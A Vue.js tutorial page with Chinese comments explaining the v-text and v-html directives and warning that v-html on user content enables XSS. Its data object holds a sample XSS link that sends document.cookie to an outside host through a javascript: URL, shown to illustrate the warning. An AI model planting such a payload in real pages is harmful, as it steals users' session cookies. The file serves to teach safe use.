<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!--
        我们学过的指令：
        v-bind:单向绑定解析表达式，可简写为 :xxx
        v-model:双向数据绑定
        v-for:遍历数组/对象/字符串
        v-on:绑定事件监听，可简写为@
        v-if:条件渲染（动态控制节点是否存在）
        v-else:条件渲染（动态控制节点是否存在）
        v-show:条件渲染（动态控制节点是否展示）

        v-text指令：
        1.作用：向其所在的节点中渲染文本内容
        2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会

        v-html指令：
        1.作用：向指定节点中渲染包含html结构的内容
        2.与插值语法的区别
            （1）v-html会替换掉节点中的所有内容，{{}}则不会
            （2）v-html可以识别html结构
        3.严重注意：v-html有安全性问题！！！！
            （1）在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
            （2）一定要在可信的内容上使用v-html，永远不要在用户提交的内容上！
    -->
    <div id="root">
        <div>hello,{{name}}</div>
        <div v-text="name"></div>
        <div v-html="name"></div>
    </div>
</body>
<script>
    Vue.config.productionTip = false;

    const vm = new Vue({
        el:'#root',
        data:{
            name:'<h3>world<h3>',
            str:'<a href=‘javascript:location.href="http://www.baidu.com?"+document.cookie>click me</a>'
        }
    });
</script>
</html>
